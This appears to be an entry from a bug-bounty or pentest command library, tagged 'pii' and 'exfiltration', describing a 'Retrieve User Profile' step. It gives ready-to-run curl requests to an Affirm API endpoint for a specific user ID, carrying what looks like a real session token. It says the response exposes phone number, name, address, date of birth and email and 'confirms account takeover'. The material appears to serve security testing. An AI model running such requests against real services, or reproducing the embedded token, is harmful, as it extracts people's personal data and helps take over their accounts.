---
data: >-
  curl -X GET https://hackerone.affirm-odin.com/api/v2/users/1479-5770-XGGL -H
  "User-Agent: okhttp/3.13.1" -H "Affirm-Client:
  .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk"
  -H "Affirm-Platform: android" -H "Affirm-User-Agent: Affirm-Android" -H
  "Affirm-App-Version: 3.62.3" -H "Affirm-App-Version-Code: 312" -H
  "Affirm-OS-Version: 22"
tags:
  - pii
  - exfiltration
type: command
output: 'HTTP 200 with JSON containing phone_number, name, address, dob, email'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.307Z'
id: 756ca652-5af3-4296-a8e3-44d51bc96dd5
verified: false
validated: true
submitted: true
---
# Retrieve User Profile

## Command

```bash
curl -X GET https://hackerone.affirm-odin.com/api/v2/users/1479-5770-XGGL \
  -H "User-Agent: okhttp/3.13.1" \
  -H "Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk" \
  -H "Affirm-Platform: android" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22"
```

## Description

Fetches sensitive user details using the authenticated session via Affirm-Client header, exploiting post-auth access for PII exposure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| user_id | User ID from auth response (e.g., 1479-5770-XGGL) | Yes |
| Affirm-Client | Session token header | Yes |

## Examples

### Basic Usage

```bash
curl -X GET https://hackerone.affirm-odin.com/api/v2/users/USER_ID -H "Affirm-Client: SESSION_TOKEN"
```

### Advanced Usage

With full headers:

```bash
curl -X GET https://hackerone.affirm-odin.com/api/v2/users/1479-5770-XGGL -H "Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk" -H "Affirm-User-Agent: Affirm-Android"
```

## Expected Output

HTTP 200 with JSON object including fields like "phone_number", "name", "address", "dob", "email". Confirms account takeover.

## Related

- [[commands/submit-otp-for-auth]]
